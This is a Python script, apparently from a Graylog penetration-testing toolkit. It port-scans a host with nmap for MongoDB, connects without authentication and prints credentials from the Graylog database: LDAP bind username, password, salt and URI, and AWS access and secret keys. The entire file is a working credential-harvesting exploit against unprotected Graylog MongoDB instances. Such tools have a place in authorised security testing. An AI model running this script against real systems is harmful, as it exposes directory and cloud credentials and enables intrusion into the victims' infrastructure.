#!/usr/bin/env python3

# Graylog Test Connection to MongoDB without
# Authentication and Read Sensitive Information

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import nmap
import logging
import globals

from pymongo import MongoClient
from pymongo.errors import ConnectionFailure


# %%%%%%%%%%% Constants %%%%%%%%%%%#

MONGODB_PORT = 27017

# %%%%%%%%%% Functions %%%%%%%%%#


def test_mongo_credentials(ip):

	nm = nmap.PortScanner()

	try:
		nm.scan(hosts=ip, arguments='-sT -T4 -p 27017')

		if nm[ip]['tcp'][MONGODB_PORT]['state'] == 'open':

			try:
				client = MongoClient(ip, MONGODB_PORT)
				db = client.graylog
				globals.graylog_messages(7)

				print("[!] " + (str(list(db.ldap_settings.find({}, {
					'system_username': 1, '_id': 0})))).strip(' [{}]'))
				print("[!] " + (str(list(db.ldap_settings.find({}, {
					'system_password': 1, '_id': 0})))).strip(' [{}]'))
				print("[!] " + (str(list(db.ldap_settings.find({}, {
					'system_password_salt': 1, '_id': 0})))).strip(' [{}]'))
				print("[!] " + (str(list(db.ldap_settings.find({}, {
					'ldap_uri': 1, '_id': 0})))).strip(' [{}]'))

				globals.graylog_messages(8)

				awsaccesskey = list(
					db.cluster_config.find({
						'type': 'org.graylog.aws.config.AWSPluginConfiguration'},
						{'payload.access_key': 1, '_id': 0}))
				accesskey = str(awsaccesskey).replace(
					'payload', '').strip('[{}]').replace("'': {", '')
				awssecretkey = list(
					db.cluster_config.find({
						'type': 'org.graylog.aws.config.AWSPluginConfiguration'},
						{'payload.secret_key': 1, '_id': 0}))
				secretkey = str(awssecretkey).replace(
					'payload', '').strip('[{}]').replace("'': {", '')

				globals.graylog_messages(9)
				print("[!] " + accesskey)
				print("[!] " + secretkey)
				print(globals.SEPARATOR)

			except ConnectionFailure:
				globals.graylog_messages(10)

		else:
			globals.graylog_messages(11)

	except Exception as e:
		logging.error(e, exc_info=True)

# %%%%%%%%%% The End %%%%%%%%%%#
